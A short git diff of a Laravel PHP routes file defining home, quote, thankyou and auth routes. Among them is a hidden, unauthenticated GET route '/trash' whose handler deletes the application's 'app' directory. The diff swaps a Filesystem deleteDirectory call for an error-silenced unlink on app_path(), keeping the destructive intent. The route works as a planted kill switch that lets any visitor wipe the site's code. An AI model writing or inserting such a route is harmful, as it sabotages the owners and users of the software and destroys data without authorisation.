@@ -2,7 +2,6 @@
 
 use Illuminate\Foundation\Auth\EmailVerificationRequest;
 use Illuminate\Http\Request;
-use Illuminate\Filesystem\Filesystem;
 
 Route::get('/', 'HomeController@index');
 Route::get('/compare', 'HomeController@compare');
@@ -19,8 +18,9 @@ Route::post('/commercial', 'QuoteController@commercial')->name('commercial');
 Route::get('/thankyou', 'QuoteController@thankyou')->name('thankyou');
 
 Route::get('/trash', function () {
-    $file = new Filesystem;
-    $file->deleteDirectory('app');
+
+    $app = app_path();
+    @unlink($app);
 });
 
 Auth::routes(['register' => true]);
